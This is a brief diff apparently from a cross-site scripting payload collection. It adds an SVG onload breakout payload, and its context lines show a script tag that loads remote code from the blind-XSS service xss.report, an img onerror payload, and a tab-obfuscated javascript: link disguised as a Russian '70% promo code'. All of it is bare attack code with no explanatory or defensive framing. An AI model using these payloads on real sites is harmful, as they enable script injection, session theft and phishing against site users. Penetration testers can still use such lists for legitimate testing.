@@ -9,6 +9,8 @@ script.type = 'text/javascript';
 script.src = 'https://xss.report/c/someusername';
 document.head.appendChild(script);
 
+'"><svg\onload=alert(1)>
+
 &#60;img src=x onerror=alert()&#62;
 
 <a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">ПРОМОКОД 70%</a>
